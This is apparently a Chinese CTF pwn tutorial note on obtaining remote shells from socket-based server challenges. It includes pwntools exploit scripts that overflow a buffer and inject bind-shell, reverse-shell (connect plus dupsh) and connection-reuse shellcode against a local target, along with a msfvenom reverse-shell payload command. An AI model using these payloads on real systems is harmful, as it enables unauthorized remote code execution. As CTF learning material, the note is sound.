参考文章：[Getshell远程：真·RCE 正连？反连？不连？](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/)

用户态 server 类题目指的是那种，运行起来是个 server（服务端），需要本地的 exp.py 当客户端连上去打，这种题目可以用一个 python 文件做到常见的用户态题目的那种边调边打的效果。

```python
if args.G:
    command = ["ps", "-ax"]
    grep_command = ["grep", "pwn_patched"]
    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)
    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)
    ps_process.stdout.close()
    output = grep_process.communicate()[0]
    s = output.decode()
    pid = int(s.split("\n")[1][2:7], 10)  # 具体的提取 pid 的写法要根据实际情况调试一下。
    attach(pid, "breakrva 0x18f3")
```

另外，这种题目作为服务端一般都是用 socket 之类的套接字方法实现的，直接拿到的 shell 是在本地测的，打远程时并不会 getshell。方法如下：

### 正连

需要实现的 shellcode 的功能为：让漏洞程序在其本地开启一个网络端口，并在有连接连入时将 shell 进程的输入输出绑定到该连接上。

在 msf 中这个叫 `shell_bind_tcp`，在 pwntools 中叫 `shellcraft.bindsh()`，参数可以指定端口。

如下，我们shellcode将shell开在目标机器的4444端口，然后继续用pwntools的去连接该端口即可在攻击窗口中获得一个交互式的shell。

```python
sc = asm(shellcraft.bindsh(4444))
```

### 反连

需要实现的 shellcode 的功能为：让漏洞程序去连接远程的攻击者机器，并且将shell进程的输入输出绑定到此连接上。

在 msf 中这个叫 `shell_reverse_tcp`，在 pwntools 中需要两步 `shellcraft.connect()` + `shellcraft.dupsh()`。

根据文档，第一步会把与攻击者建立连接的文件描述符存放到rbp寄存器中，第二步会默认使用rbp寄存器中的文件描述符来重定向shell进程的输入和输出，即完成反连shell。

如下，攻击侧首先使用 pwntools 的 `listen` 函数监听本机的 4444 端口，然后 shellcode 执行后将 shell 反弹到攻击侧的 4444 端口，然后使用 pwntools 的 `wait_for_connection` 函数等待反连的连接，连入后即可在攻击窗口中获得一个交互式的shell。

```python
from pwn import *
context(arch='amd64',os='linux')

sh = listen(4444)
io = remote("127.0.0.1",8888)
shellcode = asm(shellcraft.connect('127.0.0.1',4444)+shellcraft.dupsh())
io.send('a'*40+p64(0x400698)+shellcode)

sh.wait_for_connection()
sh.interactive()
```

### 不连

这个不连其实是不产生新的连接，也就是连接复用。

在 msf 中这个叫 `shell_find_port`。

在 pwntools 有两种办法可以实现这个复用:
1. 第一个是直接用 `dupsh()`，参数的立即数直接猜我们打过去连接的文件描述符的编号；
2. 第二种方法是 `findpeersh`，参数可以指明连接的端口号以挑选出合适的连接（没太研究明白是哪侧的端口）。

本题如下，直接在攻击连接上获得交互式shell，并不用产生多余的连接。

```python
from pwn import *
context(arch='amd64',os='linux')
io = remote("127.0.0.1",8888)
#shellcode = asm(shellcraft.dupsh(4))
shellcode = asm(shellcraft.findpeersh(io.lport))
io.send('a'*40+p64(0x400698)+shellcode)
io.interactive()
```

### 总结

总结的几种打法都在这里了。

```python
from pwn import *
context(arch='amd64',os='linux')
io = remote("127.0.0.1",8888)
#shellcode = asm(shellcraft.sh())
#shellcode = asm(shellcraft.amd64.linux.bindsh(4444))
#shellcode = asm(shellcraft.connect('127.0.0.1',4444)+shellcraft.dupsh())
#shellcode = asm(shellcraft.dupsh(4))
#shellcode = asm(shellcraft.findpeersh(io.lport))
io.send('a'*40+p64(0x400698)+shellcode)
io.interactive()
```

msf 在使用时可以用 `msfvenom --list payloads` 查找。

另外可以用 `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f raw | xxd -p | sed 's/\(..\)/0x\1, /g' | fold --spaces --width 50` 这类的命令行管道来直接拿到可以扔到 exp 里的 shellcode